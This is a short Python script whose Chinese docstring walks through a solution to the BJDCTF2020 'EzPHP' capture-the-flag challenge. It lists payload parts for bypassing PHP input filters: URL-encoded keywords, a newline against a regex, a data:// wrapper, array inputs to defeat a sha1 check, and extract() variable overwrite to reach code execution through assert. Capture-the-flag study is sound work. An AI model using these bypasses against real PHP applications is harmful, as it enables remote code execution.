#!/usr/bin/env python3
"""
BJDCTF2020 EzPHP 分析

条件分析：
1. QUERY_STRING 过滤：使用 URL 编码绕过
2. debu 参数：/^aqua_is_cute$/ 但 !== 'aqua_is_cute' -> 用换行符 %0a
3. $_REQUEST 不能有字母：用 data:// 协议或 php://input
4. file 参数：file_get_contents 需返回 'debu_debu_aqua' -> data:// 协议
5. sha1 绕过：用数组 sha1([]) === sha1([]) 且 [] != []
6. extract($_GET["flag"])：变量覆盖 $arg 和 $code
7. $code('',$arg)：需要找一个函数执行命令

关键绕过：
- QUERY_STRING 检查的是原始查询字符串，但 PHP 解析时会解码
- 用 URL 编码绕过关键词过滤
- $_REQUEST 包含 $_GET 和 $_POST，可以用 POST 传数字值
- $code 可以是 assert、create_function 等函数

构造 payload：
1. debu=aqua_is_cute%0a (URL编码后绕过 QUERY_STRING 检测)
2. file=data://text/plain,debu_debu_aqua
3. shana[]=1&passwd[]=2 (数组绕过 sha1)
4. flag[arg]=...&flag[code]=assert

需要 URL 编码关键词：
- aqua -> %61qua
- cute -> %63ute
- debu -> %64ebu
- flag -> %66lag
- arg -> %61rg
- code -> %63ode
- passwd -> %70asswd
- shana -> %73hana
"""

# 测试 URL 编码绕过
import urllib.parse

# 关键词需要编码
keywords = ['shana', 'debu', 'aqua', 'cute', 'arg', 'code', 'flag', 'passwd']

def encode_keyword(s):
    """编码关键词的第一个字母"""
    if s in keywords:
        return '%' + hex(ord(s[0]))[2:] + s[1:]
    return s

print("Payload 构造：")
print()
